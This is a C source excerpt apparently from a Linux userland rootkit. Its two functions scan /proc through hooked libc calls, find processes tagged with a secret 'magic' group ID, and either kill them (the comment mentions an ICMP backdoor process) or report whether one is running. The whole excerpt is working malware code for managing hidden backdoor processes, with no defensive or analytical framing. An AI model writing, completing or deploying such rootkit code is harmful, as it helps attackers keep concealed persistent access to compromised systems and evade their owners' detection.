void killrkprocs(gid_t magicgid){ // mainly for killing the icmp backdoor process...
    struct dirent *dir;
    DIR *dirp;
    struct stat sbuf;
    pid_t pid;

    hook(COPENDIR, CREADDIR, C__XSTAT);

    dirp = call(COPENDIR, "/proc");
    if(dirp == NULL) return;

    while((dir = call(CREADDIR, dirp)) != NULL){
        if(!strncmp(dir->d_name, ".", 1) || !strcmp(dir->d_name, "net") ||
           !strcmp(dir->d_name, "self") || !strcmp(dir->d_name, "thread-self")) continue;

        size_t pathlen = 7+strlen(dir->d_name);
        char path[pathlen];
        snprintf(path, sizeof(path), "/proc/%s", dir->d_name);

        memset(&sbuf, 0, sizeof(struct stat));
        if((long)call(C__XSTAT, _STAT_VER, path, &sbuf) < 0)
            continue;

        if(sbuf.st_gid == magicgid){
            pid = atoi(dir->d_name);
            if(pid==getpid() || pid==getppid())
                continue;
            kill(pid, SIGKILL);
        }
    }
    closedir(dirp);
}

int rkprocup(void){
    int status = 0;
    struct dirent *dir;
    DIR *dp;
    struct stat procstat;
    gid_t magicgid = readgid();

    if(getgid() == magicgid)
        return 1;

    hook(COPENDIR, CREADDIR, C__XSTAT);

    dp = call(COPENDIR, "/proc");
    if(dp == NULL) return 0;

    while((dir = call(CREADDIR, dp)) != NULL){
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "..\0"))
            continue;

        char procpath[7+strlen(dir->d_name)];
        snprintf(procpath, sizeof(procpath), "/proc/%s", dir->d_name);
        memset(&procstat, 0, sizeof(struct stat));

        if((long)call(C__XSTAT, _STAT_VER, procpath, &procstat) < 0)
            continue;

        if(procstat.st_gid == magicgid){
            status = 1;
            break;
        }
    }

    closedir(dp);
    return status;
}